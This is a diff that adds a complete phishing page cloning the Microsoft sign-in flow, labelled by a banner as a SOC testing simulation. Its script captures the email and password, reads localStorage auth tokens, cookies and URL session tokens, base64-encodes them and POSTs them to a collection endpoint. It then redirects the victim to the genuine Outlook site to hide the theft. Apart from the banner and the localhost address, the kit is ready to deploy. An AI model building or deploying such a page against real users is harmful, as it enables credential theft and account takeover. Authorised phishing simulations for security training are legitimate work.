@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    
+    <!-- Microsoft-like styling -->
+    <style>
+        html, body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+        }
+        
+        .warning-banner {
+            background-color: #ff0000;
+            color: #ffffff;
+            text-align: center;
+            padding: 10px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            font-weight: bold;
+        }
+        
+        #mainArea {
+            height: 100%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding-top: 20px;
+        }
+        
+        .login-container {
+            min-width: 320px;
+            max-width: 320px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin-bottom: 28px;
+            background-color: #fff;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .microsoft-logo {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .microsoft-logo img {
+            height: 24px;
+            margin-right: 10px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-top: 16px;
+            margin-bottom: 12px;
+            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            color: #1B1B1B;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            font-size: 14px;
+            font-weight: 400;
+            color: #1B1B1B;
+        }
+        
+        input[type="email"],
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            height: 36px;
+            padding: 6px 10px;
+            border: none;
+            border-bottom: 1px solid #0067b8;
+            outline: none;
+            font-size: 15px;
+            margin-top: 8px;
+            box-sizing: border-box;
+            background-color: transparent;
+        }
+        
+        input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+        
+        .submit-button {
+            float: right;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 14px;
+            font-weight: 400;
+            min-height: 32px;
+            min-width: 108px;
+            padding: 4px 12px;
+            text-align: center;
+            text-decoration: none;
+            vertical-align: top;
+            margin-top: 4px;
+        }
+        
+        .submit-button:hover {
+            background-color: #005da6;
+        }
+        
+        .links {
+            margin-top: 20px;
+        }
+        
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 12px;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        #emailDisplay {
+            font-size: 14px;
+            margin-bottom: 16px;
+            color: #666;
+        }
+        
+        #loginDiv, #passwordDiv {
+            width: 100%;
+        }
+        
+        #passwordDiv {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Warning banner for SOC testing only -->
+    <div class="warning-banner">
+        ⚠️ This is a security simulation for SOC testing. Do not use in production.
+    </div>
+
+    <div id="mainArea">
+        <div class="outer-container">
+            <!-- BEGIN FAKE LOGIN FORMS -->
+            <div id="loginDiv" class="login-container">
+                <div class="microsoft-logo">
+                    <svg width="24" height="24" viewBox="0 0 24 24">
+                        <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+                        <rect x="13" y="1" width="10" height="10" fill="#7fba00"/>
+                        <rect x="1" y="13" width="10" height="10" fill="#00a4ef"/>
+                        <rect x="13" y="13" width="10" height="10" fill="#ffb900"/>
+                    </svg>
+                    <span style="margin-left: 10px; color: #666; font-size: 18px;">Microsoft</span>
+                </div>
+
+                <h1>Sign in</h1>
+                <form id="emailForm">
+                    <div class="form-group">
+                        <label for="email">Email, phone, or Skype</label>
+                        <input type="email" id="email" name="email" required autocomplete="off">
+                    </div>
+                    
+                    <div class="links">
+                        <a href="#">No account? Create one!</a>
+                        <a href="#">Can't access your account?</a>
+                    </div>
+                    
+                    <div class="clearfix">
+                        <button type="submit" class="submit-button" id="nextBtn">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <div id="passwordDiv" class="login-container">
+                <div class="microsoft-logo">
+                    <svg width="24" height="24" viewBox="0 0 24 24">
+                        <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+                        <rect x="13" y="1" width="10" height="10" fill="#7fba00"/>
+                        <rect x="1" y="13" width="10" height="10" fill="#00a4ef"/>
+                        <rect x="13" y="13" width="10" height="10" fill="#ffb900"/>
+                    </svg>
+                    <span style="margin-left: 10px; color: #666; font-size: 18px;">Microsoft</span>
+                </div>
+
+                <h1>Enter password</h1>
+                <div id="emailDisplay"></div>
+                <form id="passwordForm">
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required autocomplete="off">
+                    </div>
+                    
+                    <div class="links">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                    
+                    <div class="clearfix">
+                        <button type="submit" class="submit-button" id="signInBtn">Sign in</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Phishing script -->
+    <script>
+        // Hook: Token hijack simulation
+        // Parse query params for tracking ID, token, and session
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id') || 'unknown';
+        const tokenParam = urlParams.get('token') || '';
+        const sessionParam = urlParams.get('session') || '';
+        
+        // Set up event handlers when the DOM is fully loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            // Email form submission handler
+            const emailForm = document.getElementById("emailForm");
+            if (emailForm) {
+                emailForm.addEventListener("submit", function(event) {
+                    event.preventDefault();
+                    handleEmailSubmission();
+                    return false;
+                });
+            }
+            
+            // Password form submission handler
+            const passwordForm = document.getElementById("passwordForm");
+            if (passwordForm) {
+                passwordForm.addEventListener("submit", function(event) {
+                    event.preventDefault();
+                    handlePasswordSubmission();
+                    return false;
+                });
+            }
+        });
+        
+        let capturedEmail = "";
+        
+        function handleEmailSubmission() {
+            // Get the email input value
+            const emailInput = document.getElementById("email");
+            if (!emailInput || !emailInput.value) return;
+            
+            capturedEmail = emailInput.value;
+            
+            // Display the email on the password page
+            const emailDisplay = document.getElementById("emailDisplay");
+            if (emailDisplay) {
+                emailDisplay.textContent = capturedEmail;
+            }
+            
+            // Switch from email to password view
+            const loginDiv = document.getElementById("loginDiv");
+            const passwordDiv = document.getElementById("passwordDiv");
+            
+            if (loginDiv) loginDiv.style.display = "none";
+            if (passwordDiv) passwordDiv.style.display = "block";
+        }
+        
+        function handlePasswordSubmission() {
+            // Get the password input value
+            const passwordInput = document.getElementById("password");
+            if (!passwordInput || !passwordInput.value) return;
+            
+            const password = passwordInput.value;
+            
+            // Hook: Token hijack simulation
+            // Attempt to collect local storage and session cookie values
+            const authToken = localStorage.getItem("auth_token") || '';
+            const sessionData = document.cookie || '';
+            
+            // Create a payload object with the captured data
+            const payload = {
+                username: capturedEmail,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                trackingId: userId,
+                // Include token data from various sources
+                tokenData: {
+                    urlToken: tokenParam,
+                    urlSession: sessionParam,
+                    localStorageToken: authToken,
+                    cookieData: sessionData
+                }
+            };
+            
+            // Base64 encode the payload before sending
+            const encodedPayload = btoa(JSON.stringify(payload));
+            
+            // Show a loading spinner
+            const passwordDiv = document.getElementById("passwordDiv");
+            if (passwordDiv) {
+                passwordDiv.innerHTML = `
+                    <div style="text-align: center; padding: 20px;">
+                        <div class="microsoft-logo">
+                            <svg width="24" height="24" viewBox="0 0 24 24">
+                                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+                                <rect x="13" y="1" width="10" height="10" fill="#7fba00"/>
+                                <rect x="1" y="13" width="10" height="10" fill="#00a4ef"/>
+                                <rect x="13" y="13" width="10" height="10" fill="#ffb900"/>
+                            </svg>
+                            <span style="margin-left: 10px; color: #666; font-size: 18px;">Microsoft</span>
+                        </div>
+                        <h2 style="margin-top: 20px; color: #666;">Verifying your credentials...</h2>
+                        <div style="margin: 30px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0067b8; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                    </div>
+                    <style>
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                    </style>
+                `;
+            }
+            
+            // Send data to the server
+            fetch('http://localhost:3000/api/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    encodedData: encodedPayload,
+                    trackingId: userId
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect to legitimate site after a short delay
+                setTimeout(() => {
+                    window.location.href = 'https://outlook.office.com';
+                }, 1500);
+            })
+            .catch(error => {
+                // Still redirect even if there's an error
+                setTimeout(() => {
+                    window.location.href = 'https://outlook.office.com';
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
